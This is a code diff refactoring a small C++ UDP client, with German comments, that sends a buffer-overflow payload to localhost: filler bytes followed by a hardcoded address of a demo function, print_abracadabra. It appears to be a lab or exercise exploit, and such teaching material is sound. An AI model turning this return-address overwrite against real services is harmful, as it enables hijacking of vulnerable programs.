@@ -5,6 +5,7 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <vector>
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 1234
@@ -31,7 +32,7 @@
  * aufzurufen.
  */
 
-int main(int argc, char* argv[])
+int main(int, char* argv[])
 {
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
@@ -44,14 +45,14 @@ int main(int argc, char* argv[])
     server_addr.sin_port = htons(SERVER_PORT);
     inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);
 
-    auto PAYLOAD_OFFSET_SIZE = std::strtoul(argv[1], nullptr, 10);
+    size_t PAYLOAD_OFFSET_SIZE = std::strtoul(argv[1], nullptr, 10);
 
-    char payload[PAYLOAD_OFFSET_SIZE + 8];
+    std::vector<char> payload(PAYLOAD_OFFSET_SIZE + 8);
 
-    std::memset(payload, 'A', PAYLOAD_OFFSET_SIZE);
+    std::memset(payload.data(), 'A', PAYLOAD_OFFSET_SIZE);
 
     uintptr_t func_addr = 0x0000000000401246; // Adresse von print_abracadabra
-    *(uintptr_t*)(payload + PAYLOAD_OFFSET_SIZE) = func_addr;
+    *(uintptr_t*)(payload.data() + PAYLOAD_OFFSET_SIZE) = func_addr;
 
     // Debug-Ausgabe der gesendeten Adresse
     std::cout << "[DEBUG] Vollständiger Payload vor dem Senden:" << std::endl;
@@ -60,7 +61,7 @@ int main(int argc, char* argv[])
     }
     std::cout << std::endl;
 
-    sendto(sockfd, payload, PAYLOAD_OFFSET_SIZE + 8, 0, (struct sockaddr*)&server_addr,
+    sendto(sockfd, payload.data(), PAYLOAD_OFFSET_SIZE + 8, 0, (struct sockaddr*)&server_addr,
            sizeof(server_addr));
 
     std::cout << "[INFO] Payload gesendet!" << std::endl;
